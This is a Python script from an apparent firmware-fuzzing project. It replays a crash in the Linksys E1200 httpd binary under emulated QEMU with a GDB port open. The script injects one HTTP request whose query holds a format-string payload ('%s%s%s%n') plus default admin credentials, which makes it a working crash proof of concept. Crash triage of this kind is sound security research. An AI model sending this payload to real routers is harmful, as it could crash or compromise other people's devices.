#!/usr/bin/env python3
"""
最小化重放 088311b5 crash：只注入 idx=81 HTTP 请求 mutation
用 QEMU gdbserver 模式暴露调试端口，配合 gdb-multiarch 分析崩溃位置。

Usage:
  # Terminal 1 (this script):
  python3 gdb_replay_088311b5.py

  # Terminal 2 (GDB):
  gdb-multiarch tests/images/Linksys/rootfs/usr/sbin/httpd
  (gdb) target remote :9999
  (gdb) continue
  # 等待 SIGSEGV，然后:
  (gdb) bt
  (gdb) info registers
  (gdb) x/10i $pc-20
"""
import os, sys, subprocess, time, signal
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]   # rr_fuzzing/
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "fuzzing"))

ROOTFS    = ROOT / "tests/images/Linksys/rootfs"
QEMU      = ROOT / "../../build/qemu-mipsel"
HTTPD     = ROOTFS / "usr/sbin/httpd"
TRACE     = ROOT / "tests/seeds/Linksys_E1200_auth.trace"
GDB_PORT  = 9999

# The only mutation needed to trigger the crash
PAYLOAD = b'GET /?name=%s%s%s%n HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n'

from conductor.conductor_types import FuzzInstruction
from conductor.qemu_executor import QEMUExecutor

def main():
    os.makedirs("/tmp/run", exist_ok=True)

    print(f"[*] Target   : {HTTPD}")
    print(f"[*] Trace    : {TRACE}")
    print(f"[*] GDB port : {GDB_PORT}")
    print(f"[*] Payload  : {PAYLOAD[:60]!r}...")
    print()

    # Single mutation: idx=81, FUZZ_CMD_REPLACE_BUFFER (cmd=2), HTTP request payload
    mut = FuzzInstruction(
        syscall_index=81,
        cmd=2,           # FUZZ_CMD_REPLACE_BUFFER
        arg_index=1,     # buf argument
        data=PAYLOAD,
        offset=0,
        size=len(PAYLOAD),
        mutation_type='http_request_format_string',
    )

    executor = QEMUExecutor(
        qemu_path=str(QEMU),
        target_binary=str(HTTPD),
        target_args="-p 8093",
        ld_prefix=str(ROOTFS),
        timeout=30.0,
        persistent_mode=True,
        extra_qemu_args=["-g", str(GDB_PORT)],
    )

    print("[*] Starting QEMU with gdbserver on port", GDB_PORT)
    print("[*] Connect GDB now:")
    print(f"    gdb-multiarch {HTTPD}")
    print(f"    (gdb) target remote :{GDB_PORT}")
    print(f"    (gdb) continue")
    print()
    print("[*] Running replay with format-string payload at idx=81...")

    result = executor.execute(str(TRACE), [mut])

    print(f"\n[*] Result: status={result.status_name} crashed={result.crashed}")
    if result.crashed:
        print(f"[!] CONFIRMED CRASH — format string vulnerability")
        print(f"    PC = {getattr(result, 'crash_pc', 'unknown')}")
    else:
        print("[?] No crash detected (may need GDB to catch signal)")

    executor.stop_persistent_qemu()

if __name__ == "__main__":
    main()
